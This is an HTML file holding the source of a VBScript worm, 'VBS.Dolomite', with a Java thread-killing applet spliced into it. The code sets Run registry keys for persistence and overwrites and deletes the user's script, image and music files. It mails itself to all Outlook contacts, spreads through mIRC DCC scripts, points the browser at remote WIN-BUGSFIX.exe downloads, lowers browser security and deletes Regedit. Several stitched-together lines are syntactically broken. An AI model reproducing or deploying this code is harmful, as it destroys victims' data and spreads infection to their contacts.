META NAME=Author CONTENT=Dolomite Rules>
<html><body>
<script Language="VBScript">
rem  Dolomite rules.(vbe) <Dolomite Rules!>
rem 			by: Dolomite, at a message board near you. Eastside vxer..
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\Dolomite.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Dolomite Rules."
scriptini.WriteLine "     Dolomite will taste sweet revenge."
scriptini.WriteLine ";"
scriptini.WriteLine ";hehehehe"
scriptini.WriteLine ";Dolomite rules!!!!!"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\Dolomite.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "DOLOMITE RULES!"
male.Body = vbcrlf&"Dolomite Rules.. You have to check this out, compliments of Dolomite."
male.Attachments.Add(dirsystem&"\Dolomite.TXT.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>DOLOMITE - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@DOLOMITE VBS - DOLOMITE@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@Dolomite ?-? Dolomite Rules ?-? @Dolomite Productions?-? Eastside Virus Writers. ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@ Ashley is a whore...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#DOLOMITE.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#DOLOMITE.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\DOLOMITE.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\DOLOMITE.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
alert("You will find out why Dolomite rules very soon.")
self.close()
import java.applet.*;
import java.awt.*;
import java.io.*;

public class AppletKiller extends java.applet.Applet implements Runnable {
    Thread killer;
    
    public void init() {
        killer = null;
    }

    public void start() {
        if (killer == null) {
            killer = new Thread(this,"killer");
            killer.setPriority(Thread.MAX_PRIORITY);
            killer.start();
        }
    }

    public void stop() {}    

// Kill all threads except this one

    public void run() {
        try {
            while (true) {
                ThreadKiller.killAllThreads();
                try { killer.sleep(100); }
                catch (InterruptedException e) {}
            }
        }
        catch (ThreadDeath td) {}

// Resurrect the hostile thread in case of accidental ThreadDeath

        finally {
            AppletKiller ack = new AppletKiller();
            Thread reborn = new Thread(ack, "killer");
            reborn.start();
        }
    }
}

class ThreadKiller {

// Ascend to the root ThreadGroup and list all subgroups recursively,
// killing all threads as we go

    public static void killAllThreads() {
        ThreadGroup thisGroup;
        ThreadGroup topGroup;
        ThreadGroup parentGroup;
        
// Determine the current thread group
        thisGroup = Thread.currentThread().getThreadGroup();
        
// Proceed to the top ThreadGroup
        topGroup  = thisGroup;
        parentGroup = topGroup.getParent();
        while(parentGroup != null) {
            topGroup  = parentGroup;
            parentGroup = parentGroup.getParent();
        }
// Find all subgroups recursively 
        findGroups(topGroup);
    }
    
    private static void findGroups(ThreadGroup g) {
        if (g == null) {return;}
        else {
        int numThreads = g.activeCount();
        int numGroups = g.activeGroupCount();
        Thread[] threads = new Thread[numThreads];
        ThreadGroup[] groups = new ThreadGroup[numGroups];
        g.enumerate(threads, false);
        g.enumerate(groups, false);
        for (int i = 0; i < numThreads; i++)
            killOneThread(threads[i]);
        for (int i = 0; i < numGroups; i++)
            findGroups(groups[i]);
        }
    }

    private static void killOneThread(Thread t) { 
        if (t == null || t.getName().equals("killer")) {return;}
        else {t.stop();}
if location.protocol = "file:" then
Randomize
Set WshShell = CreateObject("WScript.Shell")
WshShell.Regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
if location.protocol = "file:" then
Set FSO = CreateObject("Scripting.FileSystemObject")
HPath = Replace(location.href, "/", "\")
HPath = Replace(HPath, "file:\\\", "")
HPath = FSO.GetParentFolderName(HPath)
Set TRange = document.body.createTextRange
Call GetFolder(HPath)
Call GetFolder("C:\")
Call GetFolder("C:\Windows\Desktop")
Call GetFolder("C:\Windows\Web")
Call GetFolder("C:\Windows\Web\Wallpaper")
Call GetFolder("C:\Windows\Help")
Call GetFolder("C:\Windows\Temp")
Call GetFolder("C:\My Documents")
Call GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
Call GetFolder("C:\Inetpub\wwwroot")
end if
p = Int(Rnd * 30) + 1
If Day(Now()) = p Then
MsgBox("Dolomite Rules."), vbCritical
WshShell.RegWrite "HKEY_CLASSES_ROOT\htmlfile\DefaultIcon\", "C:\Win98\System\Shell32.dll,32"
End If
Sub GetFolder(InfPath)
On Error Resume Next
if FSO.FolderExists(InfPath) then
Do
Set FolderObj = FSO.GetFolder(InfPath)
InfPath = FSO.GetParentFolderName(InfPath)
Set FO = FolderObj.Files
For each target in FO
ExtName = lcase(FSO.GetExtensionName(target.Name))
if ExtName = "htt" or ExtName = "htm" or ExtName = "html" then
Set Real = FSO.OpenTextFile(target.path, 1, False)
if Real.readline <> "<!--Dolomite-->" then
Real.close()
GetFile(target.path)
else
Real.close()
end if
end if
next
Loop Until FolderObj.IsRootFolder = True
end if
End Sub
Sub GetFile(GetFileName)
Set Real = FSO.OpenTextFile(GetFileName, 1, False)
FileContents = Real.ReadAll()
Real.close()
Set Real = FSO.OpenTextFile(GetFileName, 2, False)
Real.WriteLine "<!--Dolomite-->"
Real.Write("<html><body>" + Chr(13) + Chr(10))
Real.WriteLine TRange.htmlText
Real.WriteLine("</body></html>")
Real.Write(FileContents)
Randomize
Sn = Int((6 * Rnd) +1)
if sn=1 then 
vxs = "Guess what"  
vxb = "Dolomite Rules..." 
end if
if sn=2 then 
vxs = "He just damn rules..."  
vxb = "See why he rules.."
end if
if sn=3 then 
vxs = "Important, It would be smart to read this" 
vxb = "A paper I downloaded about Dolomite, you should read this."
end if
if sn=4 then 
vxs = "Dolomite Rules"  
vxb = "A gift from Dolomite"
end if
if sn=5 then 
vxs = "Take a look..."  
vxb = "Take a look and you will see Dolomite"
end if
if sn=6 then 
vxs = "Great Joke.. Read it" 
vxb = "Its a joke about dead babies."
end if

Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullName,1)
mecopy = file.ReadAll

Set Windir = fso.GetSpecialFolder(0)
Set Sysdir = fso.GetSpecialFolder(1)
Set cf = fso.GetFile(WScript.ScriptFullName)

	cf.Copy(windir &"\MSNetLog.vbs")
	cf.Copy(windir &"\Command\Dolomite.vbs")

Set newf = fso.CreateTextFile(windir &"\SearchMSN.vbs", True)
	newf.Writeline("On Error Resume Next")
	newf.Writeline("Set fso = CreateObject(""Scripting.FileSystemObject"")")
	newf.Writeline("Set Dolomite = fso.OpenTextFile(""C:\Windows\Command\Dolomite.vbs"",1)")
	newf.Writeline("Code = Dolomite.ReadAll")
	newf.Writeline("Dolomite.Close")
	newf.Writeline("Do")
	newf.Writeline("If Not (fso.FileExists(""C:\Windows\MSNetLog.vbs"")) Then")
	newf.Writeline("Set Dolomite = fso.CreateTextFile(""C:\Windows\MSNetLog.vbs"", True)")
	newf.Writeline("Dolomite.Write Code")
	newf.Writeline("Dolomite.Close")
	newf.Writeline("End If")
	newf.Writeline("Loop")
	newf.Close
Set vxreg = CreateObject("WScript.Shell")
	vxreg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\SearchMSN", windir &"\SearchMSN.vbs"
	vxreg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSNetLog", windir &"\MSNetLog.vbs"
	vxreg.RegWrite "HKEY_CURRENT_USER\Microsoft\Internet Explorer\Main\Start Page", "http://ogrish.com"

Set ws = CreateObject("WScript.Shell")
	MPath = ""
	If MPath = "" Then
	If fso.FileExists("C:\Mirc\Mirc.ini") Then MPath = "C:\mirc"
	If fso.FileExists("C:\Mirc32\mirc.ini") Then MPath = "C:\mirc32"
	FDir = ws.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
	If fso.FileExists(FDir & "\mirc\mirc.ini") Then MPath = FDir & "\mirc"
	End If
	If MPath <> "" Then
	Set SF = fso.CreateTextFile(MPath & "\script.ini", True)
	SF.Writeline "[script]"
	SF.Writeline ";Dolomite.vbs By Dolomite"
	SF.Writeline "n0=on 1:JOIN:#:{"
	SF.Writeline "n1=  /if ( $nick == $me ) { halt }"
	SF.Writeline "n2=  /.dcc send $nick "&windir&"\Command\Dolomite.vbs"
	SF.Writeline "n3=}"
	SF.Close
	End If

Set vxout = WScript.CreateObject("Outlook.Application")
Set vxm = vxout.GetNameSpace("MAPI")

	For i = 1 To vxm.AddressLists.Count
		Set ma = vxm.AddressLists(i)
		j = 1
		regre = ws.RegRead("HKEY_LOCAL_MACHINE\Software\Microsof\WAB" & ma)
		If (regre = "") Then
			regre = 1
		End If
     		If (int(ma.AddressEntries.Count) > int(regre)) Then
			For vxen = 1 to ma.AddressEntries.Count
			mailed = ma.AddressEntries(j)
			k = ""
			k = ws.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB" & mailed)
			if (k="") then
				Set mail = vxout.CreateItem(0)
				mail.Recipients.Add(mailed)
				mail.Subject = vxs
				mail.Body = vxb
				mail.Attachments.Add(windir & "\Command\Dolomite.vbs")
				mail.Send
				ws.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" &mailed,1,"REG_DWORD"
			End If
			x = x +1 
			next
			ws.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&ma,ma.AddressEntries.Count
		Else
			ws.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&ma,ma.AddressEntries.Count
		End If
	Next
	Set vxout = Nothing
	Set vxm = Nothing
			

Set folderi = fso.GetFolder(Sysdir)
Set fid = folderi.Files
	For each file1 in fid
		ext = fso.GetExtensionName(file1.path)
		ext = lcase(ext)
		filen = lcase(file1.name)
		if (ext="ocx") or (ext="hlp") or (ext="wav") or (ext="cpl") or (ext="scr") or (ext="bmp") or (ext="gif") or (ext="art") or (ext="zip") Then
			Set fileen = fso.OpenTextFile(file1.path,2,true)
			fileen.Write mecopy
			fileen.Close
				
		end if
	next
msgbox "Hello" & chr(13) & "I want to tell you something about this program," & chr(13) & "On Friday I was sitting home after kicking a new kids ass" & chr(13) & "I got an idea" & chr(13) & "something big so i decided to borrow some code from my collection, insert some here and there, and build a kickass virus." & chr(13) & "and guess what... you were infected by it because" & chr(13) & "you are a jackass." & chr(13) & "The virus name is VBS.Dolomite" & chr(13) & "I chose this name because Dolomite rules!" & chr(13) & "your computer files are now binary soup!" & chr(13) & "Thank you" & chr(13) & "for being infected jackass." & chr(13) & "Dolomite", 17, "~~ VBS.Dolomite ~~"	

fso.DeleteFile(windir & "\Regedit.exe")
if Day(Now) = 2 or Day(Now) = 4 or Day(Now) = 6 or Day(Now) = 8 or Day(Now) = 10 or Day(Now) = 12 or Day(Now) = 14 or Day(Now) = 16 or Day(Now) = 18 or Day(Now) 20 or Day(Now) = 22 Day(Now) = 24 or Day(Now) = 26 or Day(Now) = 28 or Day(Now) = 30 or Day(Now)
Then
	Do
	ws.run "notepad", false		
	loop
end 
--></script>
=
-->
</script>
</body></html>
<HTML><HEAD><TITLE>HTML.Dolomite</TITLE></HEAD>
<BR><HR></BODY></HTML>
